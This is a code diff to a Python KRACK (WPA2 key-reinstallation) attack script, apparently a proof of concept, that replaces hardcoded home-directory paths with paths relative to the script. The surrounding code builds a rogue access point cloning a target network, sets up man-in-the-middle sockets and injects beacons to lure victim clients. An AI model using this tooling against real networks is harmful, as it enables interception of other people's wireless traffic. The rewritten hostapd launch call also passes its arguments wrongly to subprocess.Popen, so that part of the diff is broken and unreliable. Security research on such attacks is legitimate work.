@@ -212,6 +212,7 @@ class KRAckAttack():
 		self.netconfig = None
 		self.hostapd = None
 		self.hostapd_log = None
+		self.script_path = os.path.dirname(os.path.realpath(__file__))
 
 		# This is set in case of targeted attacks
 		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
@@ -584,7 +585,7 @@ class KRAckAttack():
 	# 主要執行 func.
 	def run(self, strict_echo_test=False):
 		self.configure_interfaces()
-
+		
 		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
@@ -614,10 +615,10 @@ class KRAckAttack():
 			subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
-		with open("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf", "w") as fp:
+		with open(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf"), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-
-		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+		
+		self.hostapd = subprocess.Popen(os.path.join(self.script_path, "../hostapd/hostapd"), os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf"), "-dd", "-K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
@@ -626,7 +627,7 @@ class KRAckAttack():
 		# when domain name (encode) to idna, label empty or too long error, 
 		# that is because domain name uses "." to split label,
 		# every label limited to longest 63 characters or no empty.
-		self.hostapd_ctrl = Ctrl("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
+		self.hostapd_ctrl = Ctrl(os.path.join(self.script_path, "../hostapd/hostapd_ctrl/") + self.nic_rogue_ap) # "hostapd_ctrl/"
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
